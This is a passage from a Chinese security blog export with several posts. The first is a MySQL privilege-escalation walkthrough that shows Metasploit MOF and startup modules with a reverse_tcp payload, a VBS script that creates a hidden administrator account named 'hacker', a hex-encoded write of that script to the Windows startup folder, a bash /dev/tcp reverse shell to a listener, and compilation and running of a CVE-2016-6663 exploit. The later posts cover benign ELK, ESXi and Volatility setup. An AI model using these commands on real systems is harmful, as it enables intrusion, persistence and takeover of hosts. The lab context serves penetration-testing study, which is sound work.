hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动服务</span></span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure><h2 id="MSF-MOF-提权"><a href="#MSF-MOF-提权" class="headerlink" title="MSF MOF 提权"></a>MSF MOF 提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="comment"># 设置好自己的 payload</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="comment"># 设置目标 MySQL 的基础信息</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 192.168.201.159</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> username root</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> password root</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028153208039.png" alt="image-20211028153208039"></p><h1 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h1><h2 id="手工复现-1"><a href="#手工复现-1" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="启动项路径"><a href="#启动项路径" class="headerlink" title="启动项路径"></a>启动项路径</h3><p><strong>Windows Server 2003</strong> 的启动项路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 中文系统</span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</span><br><span class="line">C:\Documents and Settings\All Users\「开始」菜单\程序\启动</span><br><span class="line"></span><br><span class="line"># 英文系统</span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line"># 开关机项 需要自己建立对应文件夹</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br></pre></td></tr></table></figure><p><strong>Windows Server 2008</strong> 的启动项路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> WshShell=WScript.<span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">WshShell.Run <span class="string">&quot;net user hacker P@ssw0rd /add&quot;</span>, <span class="number">0</span></span><br><span class="line">WshShell.Run <span class="string">&quot;net localgroup administrators hacker /add&quot;</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="Mysql写入启动项"><a href="#Mysql写入启动项" class="headerlink" title="Mysql写入启动项"></a>Mysql写入启动项</h3><p>将上述 vbs 或者 CS 的马转十六进制直接写如到系统启动项中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile &quot;C:\\Documents and Settings\Administrator\\「开始」菜单\\程序\\启动\\test.vbs&quot;;</span><br></pre></td></tr></table></figure><p>写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。</p><h2 id="MSF-启动项提权"><a href="#MSF-启动项提权" class="headerlink" title="MSF 启动项提权"></a>MSF 启动项提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_start_up</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 MySQL 连接信息</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 192.168.201.159</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> username root</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> password root</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028163924059.png" alt="image-20211028163924059"></p><blockquote><p>写不进去，下次再看</p></blockquote><h1 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h1><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>部署国光师傅打包的一个 Docker 镜像(用户名为root密码为空)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拉取镜像</span></span><br><span class="line">docker pull sqlsec/cve-2016-6663</span><br><span class="line"><span class="comment"># 部署镜像</span></span><br><span class="line">docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663</span><br></pre></td></tr></table></figure><p>添加一个 test 数据库用户，密码为 123456 并赋予一些基础权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 创建 test 数据库</span><br><span class="line">mysql &gt; create database test;</span><br><span class="line"></span><br><span class="line"># 设置 test 密码为 123456</span><br><span class="line">mysql &gt; CREATE USER &#x27;test&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27;; </span><br><span class="line"></span><br><span class="line"># 赋予基础权限</span><br><span class="line">mysql &gt; grant create,drop,insert,select on test.* to &#x27;test&#x27;@&#x27;%&#x27;;</span><br><span class="line"></span><br><span class="line"># 刷新权限</span><br><span class="line">mysql &gt; flush privileges;</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>竞争条件提权漏洞，一个拥有 CREATE/INSERT/SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限</p><p><strong>利用成功条件</strong></p><ol><li>Getshell 拿到 www-data 权限</li><li>拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户</li><li>关键提取步骤需要在交互环境下，所以需要反弹 shell</li><li>MySQL 版本需要 &lt;=5.5.51 或 5.6.x &lt;=5.6.32 或 5.7.x &lt;=5.7.14 或 8.x &lt; 8.0.1</li><li>MariaDB 版本需要 &lt;= 5.5.51 或 10.0.x &lt;= 10.0.27 或 10.1.x &lt;= 10.1.17</li></ol><p>CVE-2016-6663 EXP mysql-privesc-race.c 参考链接：<a href="https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html">MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit</a></p><p>shell国光师傅已经给出来了</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028180554314.png" alt="image-20211028180554314"></p><p>通过蚁剑上传 EXP，然后 Bash 反弹 shell：</p><p>首先 192.168.201.144 端口开启监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lvp 2333</span><br></pre></td></tr></table></figure><p>在蚁剑终端，反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.201.144/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>编译<a href="http://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/mysql-privesc-race.c">exp</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc mysql-privesc-race.c -o mysql-privesc-race -I /usr/include/mysql -lmysqlclient</span><br></pre></td></tr></table></figure><p>执行exp提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库</span></span><br><span class="line">./mysql-privesc-race <span class="built_in">test</span> 123456 localhost <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028185918252.png" alt="image-20211028185918252"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> MySQL </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELK部署</title>
      <link href="/p/dd49d155.html"/>
      <url>/p/dd49d155.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.elastic.co/elasticsearch/">Elasticsearch</a> 是一个非常强大的搜索引擎。它目前被广泛地使用于各个IT公司。Elasticsearch 是由 <a href="http://elastic.co/">Elastic</a> 公司创建。它的代码位于 <a href="https://github.com/elastic/elasticsearch%E3%80%82%E7%9B%AE%E5%89%8D%EF%BC%8CElasticsearch">https://github.com/elastic/elasticsearch。目前，Elasticsearch</a> 是一个免费及开放（free and open）的项目。同时，Elastic 公司也拥有 <a href="https://github.com/elastic/logstash">Logstash</a> 及 <a href="https://github.com/elastic/kibana">Kibana</a> 开源项目。这个三个开源项目组合在一起，就形成了 <strong>ELK</strong> 软件栈。他们三个共同形成了一个强大的生态圈。简单地说，<strong>L</strong>ogstash 负责数据的采集，处理（丰富数据，数据转换等），<strong>Ki</strong>bana 负责数据展示，分析，管理，监督及应用。Elasticsearch 处于最核心的位置，它可以帮我们对数据进行快速地搜索及分析。</p><h2 id="部署Elasticsearch"><a href="#部署Elasticsearch" class="headerlink" title="部署Elasticsearch"></a>部署Elasticsearch</h2><p>下载地址</p><p><a href="https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.15.0-linux-x86_64.tar.gz">LINUX X86_64</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -xzf elasticsearch-7.15.0-linux-x86_64.tar.gz</span><br><span class="line">cd elasticsearch-7.15.0</span><br></pre></td></tr></table></figure><p>修改配置文件</p><p><code>/home/user/elasticsearch-7.15.0/config/elasticsearch.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">network.host: 0.0.0.0</span><br><span class="line">discovery.seed_hosts: [&quot;0.0.0.0&quot;] #解决报错[3]</span><br></pre></td></tr></table></figure><blockquote><p>通过设置 network.host 为 0.0.0.0，它表明 Elasticsearch 可以绑定电脑的任何 IP 地址。你可以使用私有地址 http://<private_ip>:9200 来进行访问。当然你可以通过 <a href="http://localhost:9200/">http://localhost:9200</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node.name: node-1</span><br><span class="line">cluster.initial_master_nodes: [&quot;node-1&quot;]</span><br></pre></td></tr></table></figure><blockquote><p>这里不设置kibana启动不了，报<code>Kibana server is not ready yet</code></p></blockquote><mark class="hl-label red">报错</mark> <p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005183130348.png" alt="image-20211005183130348"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ERROR: [3] bootstrap checks failed. You must address the points described in the following [3] lines before starting Elasticsearch.</span><br><span class="line">bootstrap check failure [1] of [3]: max file descriptors [4096] for elasticsearch process is too low, increase to at least [65535]</span><br><span class="line">bootstrap check failure [2] of [3]: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]</span><br><span class="line">bootstrap check failure [3] of [3]: the default discovery settings are unsuitable for production use; at least one of [discovery.seed_hosts, discovery.seed_providers, cluster.initial_master_nodes] must be configured</span><br></pre></td></tr></table></figure><p>解决方法 <a href="https://blog.csdn.net/feng12345zi/article/details/80367907">ElasticSearch启动报错，bootstrap checks failed</a></p><p>[1]max file descriptors [4096] for elasticsearch process is too low, increase to at least [65536]</p><p>编辑 <code>/etc/security/limits.conf</code>，追加以下内容；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* soft nofile 65536</span><br><span class="line">* hard nofile 65536</span><br></pre></td></tr></table></figure><blockquote><p>此文件修改后需要重新登录用户，才会生效</p></blockquote><p>[2]max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]</p><p>编辑 <code>/etc/sysctl.conf</code>，追加以下内容：</p><p><code>vm.max_map_count=262144</code></p><p>保存后，执行：</p><p><code>sysctl -p</code></p><p>启动Elasticsearch</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost user]# netstat -ntlp|grep 9*00</span><br><span class="line">tcp6       0      0 :::9200                 :::*                    LISTEN      20512/java          </span><br><span class="line">tcp6       0      0 :::9300                 :::*                    LISTEN      20512/java</span><br></pre></td></tr></table></figure><blockquote><p>9300:集群内节点通讯端口<br>9200:Elasticsearch开放的REST接口</p></blockquote><p>命令行访问</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://localhost:9200/?pretty&#x27;</span><br></pre></td></tr></table></figure><p>浏览器访问</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005215047008.png" alt="image-20211005215047008"></p><p>作为进程守护运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch -d -p pid</span><br></pre></td></tr></table></figure><blockquote><p>上面的这个命令把运行的进程存放于一个叫做 pid 的文件之中，为了方便下面的终止。可以在 $ES_HOME/logs/ 目录中找到日志消息。</p></blockquote><p>要关闭 Elasticsearch，请终止 pid 文件中记录的进程 ID</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill -F pid</span><br></pre></td></tr></table></figure><p>通过如下的 jps （Java Virtual Machine Process Status Tool）来查看 Elasticsearch 的运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost user]# jps | grep Elasticsearch</span><br><span class="line">4721 Elasticsearch</span><br></pre></td></tr></table></figure><blockquote><p><code>yum install -y  java-1.8.0-openjdk-devel</code></p></blockquote><p>停止运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 4721</span><br></pre></td></tr></table></figure><p><a href="https://elasticstack.blog.csdn.net/article/details/99413578">参考链接</a></p><h2 id="部署Kibana"><a href="#部署Kibana" class="headerlink" title="部署Kibana"></a>部署Kibana</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://artifacts.elastic.co/downloads/kibana/kibana-7.15.0-linux-x86_64.tar.gz</span><br><span class="line">tar -zxf kibana-7.15.0-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/kibana</span><br></pre></td></tr></table></figure><p>修改配置文件<code>/config/kibana.yml</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch.hosts: [&quot;http://localhost:9200&quot;]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将localhost修改为Elasticsearch所在ip</span></span><br><span class="line">i18n.locale: &quot;zh-CN&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">设置中文</span></span><br></pre></td></tr></table></figure><h2 id="部署Winlogbeat"><a href="#部署Winlogbeat" class="headerlink" title="部署Winlogbeat"></a>部署Winlogbeat</h2><h3 id="下载并安装-Winlogbeat"><a href="#下载并安装-Winlogbeat" class="headerlink" title="下载并安装 Winlogbeat"></a>下载并安装 Winlogbeat</h3><p><a href="http://192.168.77.198:5601/app/home#/tutorial/windowsEventLogs">下载</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files\Winlogbeat&quot;</span></span><br><span class="line">.\<span class="built_in">install-service</span><span class="literal">-winlogbeat</span>.ps1</span><br></pre></td></tr></table></figure><blockquote></blockquote><p>在 <code>C:\Program Files\Winlogbeat\winlogbeat.yml</code> 文件中修改 <code>output.elasticsearch</code> 下的设置以指向您的 Elasticsearch 安装。</p><h3 id="编辑配置"><a href="#编辑配置" class="headerlink" title="编辑配置"></a>编辑配置</h3><p>修改 <code>C:\Program Files\Winlogbeat\winlogbeat.yml</code> 以设置连接信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">output.elasticsearch:</span><br><span class="line">  hosts: [&quot;&lt;es_url&gt;&quot;]</span><br><span class="line">  username: &quot;elastic&quot;</span><br><span class="line">  password: &quot;&lt;password&gt;&quot;</span><br><span class="line">setup.kibana:</span><br><span class="line">  host: &quot;&lt;kibana_url&gt;&quot;</span><br></pre></td></tr></table></figure><p>其中，<code>&lt;password&gt;</code> 是 <code>elastic</code> 用户的密码，<code>&lt;es_url&gt;</code> 是 Elasticsearch 的 URL，<code>&lt;kibana_url&gt;</code> 是 Kibana 的 URL。</p><h3 id="启动Winlogbeat"><a href="#启动Winlogbeat" class="headerlink" title="启动Winlogbeat"></a>启动Winlogbeat</h3><p><code>setup</code> 命令加载 Kibana 仪表板。如果仪表板已设置，请省略此命令。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\winlogbeat.exe setup</span><br><span class="line"><span class="built_in">Start-Service</span> winlogbeat</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 蓝队建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ESXI实现三层路由</title>
      <link href="/p/25b09543.html"/>
      <url>/p/25b09543.html</url>
      
        <content type="html"><![CDATA[<h2 id="实现拓扑"><a href="#实现拓扑" class="headerlink" title="实现拓扑"></a>实现拓扑</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005132129301.png" alt="image-20211005132129301"></p><h2 id="ESXI配置"><a href="#ESXI配置" class="headerlink" title="ESXI配置"></a>ESXI配置</h2><p>管理口网卡，默认配置无需更改。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005133347623.png" alt="image-20211005133347623"></p><h3 id="sw0"><a href="#sw0" class="headerlink" title="sw0"></a>sw0</h3><p>默认的虚拟交换机，接上行链路连物理网卡。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005133521346.png" alt="image-20211005133521346"></p><h3 id="sw1"><a href="#sw1" class="headerlink" title="sw1"></a>sw1</h3><p>添加虚拟交换机<strong>vSwitch1</strong>，无需接上行链路，添加4个端口组（安全区、业务区、终端区、外部）</p><mark class="hl-label orange">注意</mark> 虚拟交换机需要配置vSwitch1，VLAN ID 4095<h2 id="旁路由配置"><a href="#旁路由配置" class="headerlink" title="旁路由配置"></a>旁路由配置</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005135541194.png" alt="image-20211005135541194"></p><p>配置双网卡</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005204516820.png" alt="image-20211005204516820"></p><p>磁盘挂载现有磁盘，导入软路由镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://netflixcn.com/miji/46.html</span><br><span class="line">https://u.nu/qy6z</span><br><span class="line">https://fw.koolcenter.com/LEDE_X64_fw867/</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005163701951.png" alt="image-20211005163701951"></p><blockquote><p>设置虚拟设备节点</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005165323089.png" alt="image-20211005165323089"></p><mark class="hl-label orange">注意</mark>  只是暂时这么配置<h3 id="配置管理LAN口和WAN口（两个都是挂载eth1上，接外部网络）"><a href="#配置管理LAN口和WAN口（两个都是挂载eth1上，接外部网络）" class="headerlink" title="配置管理LAN口和WAN口（两个都是挂载eth1上，接外部网络）"></a>配置管理LAN口和WAN口（两个都是挂载eth1上，接外部网络）</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006125656368.png" alt="image-20211006125656368"></p><blockquote><p>LAN-eth1需要最后配置</p></blockquote><h3 id="安全区、业务区、终端区接口配置"><a href="#安全区、业务区、终端区接口配置" class="headerlink" title="安全区、业务区、终端区接口配置"></a>安全区、业务区、终端区接口配置</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130033396.png" alt="image-20211006130033396"></p><p>安全区LAN1<code>10.1.1.X</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006125942068.png" alt="image-20211006125942068"></p><p>业务区LAN2<code>10.1.2.X</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130051651.png" alt="image-20211006130051651"></p><p>终端区LAN3<code>10.1.3.X</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130110370.png" alt="image-20211006130110370"></p><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130213278.png" alt="image-20211006130213278"></p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130332009.png" alt="image-20211006130332009"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130351908.png" alt="image-20211006130351908"></p><h3 id="nat"><a href="#nat" class="headerlink" title="nat"></a>nat</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130425331.png" alt="image-20211006130425331"></p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130529972.png" alt="image-20211006130529972"></p><h2 id="上机测试"><a href="#上机测试" class="headerlink" title="上机测试"></a>上机测试</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130725812.png" alt="image-20211006130725812"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>volatility</title>
      <link href="/p/616fb6ec.html"/>
      <url>/p/616fb6ec.html</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://github.com/volatilityfoundation/volatility/releases">https://github.com/volatilityfoundation/volatility/releases</a></p><p><a href="https://voltraining.wixsite.com/volatilityfoundation/releases">https://voltraining.wixsite.com/volatilityfoundation/releases</a></p><p>volatility_2.6_win64_standalone.zip</p><p>volatility_2.6_lin64_standalone.zip</p><p>安装方式有很多</p><h3 id="kali2021"><a href="#kali2021" class="headerlink" title="kali2021"></a>kali2021</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/volatilityfoundation/volatility</span><br><span class="line">python setup.py build</span><br><span class="line">python setup.py install</span><br><span class="line">chmod +x vol.py</span><br><span class="line"></span><br><span class="line">大坑重灾区</span><br><span class="line">pip install yara-python #https://github.com/VirusTotal/yara-python</span><br><span class="line">pip install distorm3 #这个不好装</span><br><span class="line">pip install pycrypto #这个也不好装</span><br><span class="line">pip install openpyxl </span><br><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621242358914-298752d4-d8f8-4639-afb5-76fabd8de1bc.png" alt="img"></p><blockquote><p>pip install –upgrade setuptools</p></blockquote><p>中间还有很多坑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y python2.7-dev</span><br></pre></td></tr></table></figure><p>确定是<code>yara</code>的问题了</p><p>参考链接<a href="https://yara.readthedocs.io/en/v4.1.0/gettingstarted.html">https://yara.readthedocs.io/en/v4.1.0/gettingstarted.html</a></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621245031735-bda26bdd-60b6-4990-92c7-d6b34c97270a.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/lib/python2.7/dist-packages/usr/lib/libyara.so /usr/lib/libyara.so</span><br></pre></td></tr></table></figure><p>不报错了</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621245184755-4a1da13c-3e9e-4cff-8364-fa7a15e6557e.png" alt="img"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>需要识别到版本号，版本号较多。</p><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f &lt;文件名&gt; --profile=&lt;配置文件&gt; &lt;插件&gt; [插件参数]</span><br><span class="line">python vol.py -f &lt;文件名&gt; --profile=&lt;配置文件&gt; &lt;插件&gt; [插件参数]</span><br></pre></td></tr></table></figure><h3 id="判断未知内存镜像系统版本信息-imageinfo-kdbgscan"><a href="#判断未知内存镜像系统版本信息-imageinfo-kdbgscan" class="headerlink" title="判断未知内存镜像系统版本信息-imageinfo/kdbgscan"></a>判断未知内存镜像系统版本信息-imageinfo/kdbgscan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img imageinfo</span><br></pre></td></tr></table></figure><blockquote><p>imageinfo  用于标识操作系统、service pack和硬件体系结构（32位或64位）；可能有多个建议的配置文件，必须选择正确的配置文件</p></blockquote><h3 id="列出转储时运行的进程的详细信息-pslist-pstree-psscan"><a href="#列出转储时运行的进程的详细信息-pslist-pstree-psscan" class="headerlink" title="列出转储时运行的进程的详细信息-pslist/pstree/psscan"></a>列出转储时运行的进程的详细信息-pslist/pstree/psscan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 pslist 